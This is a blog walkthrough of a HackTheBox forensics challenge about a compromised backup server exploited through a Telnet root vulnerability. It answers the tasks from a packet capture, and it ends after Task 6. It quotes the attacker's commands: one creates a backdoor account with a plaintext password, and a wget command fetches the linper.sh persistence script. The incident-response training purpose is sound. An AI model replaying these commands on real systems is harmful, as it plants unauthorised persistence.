This post today will be about Telly - a HackTheBox Sherlock about the shiny new vulnerability of Telnet where it grants you sudo from userspace, in a pretty trivial manner.

I will do a walkthrough the tasks in Sherlock first, then we will go on how this particular CVE works. 


## Scenario 
You are a Junior DFIR Analyst at an MSSP that provides continuous monitoring and DFIR services to SMBs. Your supervisor has tasked you with analyzing network telemetry from a compromised backup server. A DLP solution flagged a possible data exfiltration attempt from this server. According to the IT team, this server wasn't very busy and was sometimes used to store backups.

**Folder structure** 
```
❯ tree
.
└── monitoringservice_export_202610AM-11AM.pcapng
```

## Task 1
_What CVE is associated with the vulnerability exploited in the Telnet protocol?_

When I first skim on the whole log, it was like:"That's weird, how did you get into root right away? And with Telnet? That's strange". 

Then I hit up Google and saw search result for "Telnet root vulnerability". And, it was [CVE-2026-24061](https://www.txone.com/blog/cve-2026-24061-gnu-inetutils-telnet-exploitation/).

## Task 2 
_When was the Telnet vulnerability successfully exploited, granting the attacker remote root access on the target machine?_

It's when the first TELNET protocol appeared in the log. 

Answer: 2026-01-27 10:39:28

## Task 3
_What is the hostname of the targeted server?_

Right-click on the above telnet event > Follow > Follow TCP Stream, you should see within the first lines: 

```
Linux 6.8.0-90-generic (backup-secondary) (pts/1)
```

It is highly recommended that you read everything in that TCP stream first before you proceed further, as the rest of the writeup will constantly refer to it one way or another. Luckily, it's a short one.


## Task 4 
_The attacker created a backdoor account to maintain future access. What username and password were set for that account?_

Same TCP stream, scroll down further a bit and you will see these lines: 
```
.[200~sudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc:YouKnowWhoiam69" | sudo chpasswd.[201~
.[7msudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc:YouKnowWhoiam69" | sudo chpasswd.[27m
```

Without all the surrounding mess, it should be:

```
sudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc:YouKnowWhoiam69" | sudo chpasswd
```

## Task 5 
_What was the full command the attacker used to download the persistence script?_

After finding out the **sensitive database**, the hacker began to install a persistance and execute script, namely `linper.sh`. 

In the TCP stream: 
```
..[?2004h.]0;root@backup-secondary: /tmp.root@backup-secondary:/tmp# 
w
w
g
g
e
e
t
t
 
 
.[200~https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh.[201~
.[7mhttps://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh.[27m
```

In clean format: 
```
wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
```

## Task 6 
_The attacker installed remote access persistence using the persistence script. What is the C2 IP address?_

I make a blind guess on the IP that appeared in the middle of the stream, and somehow it was right. After everything is done, I look back on the task and lookup on how to use the [linper.sh](https://github.com/montysecurity/linper).










